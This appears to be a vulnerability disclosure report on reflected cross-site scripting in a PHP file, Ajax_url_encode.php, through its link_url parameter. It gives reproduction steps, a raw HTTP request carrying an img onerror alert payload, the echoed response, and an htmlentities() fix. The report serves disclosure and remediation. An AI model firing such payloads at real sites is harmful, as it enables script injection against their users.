| Description: Because of lacking of sanitizer of input data at `$_REQUEST['link_url']` in `Ajax_url_encode.php` file, The Unauthenticated user can inject and execute javascript code on `link_url` parameter [image](https://user-images.githubusercontent.com/54875703/131649372-9f2c37d6-31e0-471e-b515-90d8410e6d43.png)  Testing on local site: [image](https://user-images.githubusercontent.com/54875703/131649432-7d5edb12-a593-4b77-9497-5ee890808d30.png)  Testing on demo site: [image](https://user-images.githubusercontent.com/54875703/131649469-e857296c-cc7c-420d-97cd-6ab179cb8747.png) To ReproduceXSS 1 Steps to reproduce the behavior:   1. Acess `Ajax_url_encode.php` file 2. Add `?link_url=[malicious script in here]` behind `Ajax_url_encode.php` file 3. The backend will echo and execute malicious script  Request ``` GET /Ajax_url_encode.php?link_url=%3Cimg%20src=x%20onerror=alert(1);%3E HTTP/1.1 Host: 172.16.0.12:2222 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:90.0) Gecko/20100101 Firefox/90.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate DNT: 1 Connection: close Cookie: PHPSESSID=mebdcag3g6jknfb8edrmee7ijp Upgrade-Insecure-Requests: 1   ``` Response ``` HTTP/1.1 200 OK Date: Wed, 01 Sep 2021 09:38:31 GMT Server: Apache/2.4.48 (Win64) OpenSSL/1.1.1k PHP/7.4.21 X-Powered-By: PHP/7.4.21 Content-Length: 31 Connection: close Content-Type: text/html; charset=UTF-8   <img src=x onerror=alert(1);>   ``` Solution: use `htmlentities()` function when echo the output  ``` echo htmlentities($encoded_url);  ``` |
